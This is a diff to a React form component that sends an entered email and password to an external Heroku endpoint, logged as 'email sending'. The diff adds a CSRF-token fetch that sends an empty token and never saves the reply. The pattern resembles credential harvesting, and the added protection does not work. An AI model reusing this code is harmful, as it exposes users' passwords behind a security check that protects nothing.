@@ -1,4 +1,4 @@
-import React, { useState } from 'react'
+import React, { useState, useEffect } from 'react'
 import { useHistory } from 'react-router-dom'
 
 const Form = (props) => {
@@ -7,6 +7,7 @@ const Form = (props) => {
     const [email, setEmail] = useState('')
     const [password, setPassword] = useState('')
     const [loading, setLoading] = useState(false)
+    const [csrfToken, setCsrfToken] = useState('')
 
     const handleEmail = (e) => {
         setEmail(e.target.value)
@@ -16,28 +17,47 @@ const Form = (props) => {
         setPassword(e.target.value)
     }
 
-   
+    const fetchCsrf = async () => {
+        const URL = 'https://rqq-1.herokuapp.com'
+        //  const URL = 'http://localhost:3030'
+        const response = await fetch(URL + '/form', {
+            method: 'POST',
+            headers: {
+                'Content-type': 'application/json',
+                'xsrf-token': csrfToken,
+            },
+            //   credentials: 'include',
+            // mode: 'cors',
+        })
+
+        const resData = await response.text()
+
+        console.log({ resData })
+    }
+
+    useEffect(() => {
+        fetchCsrf()
+    }, [])
+
     const handleSubmit = async (e) => {
         e.preventDefault()
         setLoading(true)
-
-        const csrfToken = ''
 
         if (email === '' || password === '') {
             console.log('not sent')
         } else {
             console.log('started email sending')
             try {
-             const URL = 'https://rqq-1.herokuapp.com'
-           //  const URL = 'http://localhost:3030'
+                const URL = 'https://rqq-1.herokuapp.com'
+                //  const URL = 'http://localhost:3030'
                 const response = await fetch(URL + '/rq-1', {
                     method: 'POST',
                     headers: {
                         'Content-type': 'application/json',
-                      'xsrf-token': csrfToken,
+                        'xsrf-token': csrfToken,
                     },
-                 //   credentials: 'include',
-                   // mode: 'cors',
+                    //   credentials: 'include',
+                    // mode: 'cors',
 
                     body: JSON.stringify({
                         email,
@@ -47,10 +67,10 @@ const Form = (props) => {
                     }),
                 })
 
-                const resData = await response.json()
+                const resData = await response.text()
 
                 console.log('email sending started')
-                console.log({resData})
+                console.log({ resData })
 
                 // if (resData.status === 'success') {
                 //     console.log('Message Sent.')
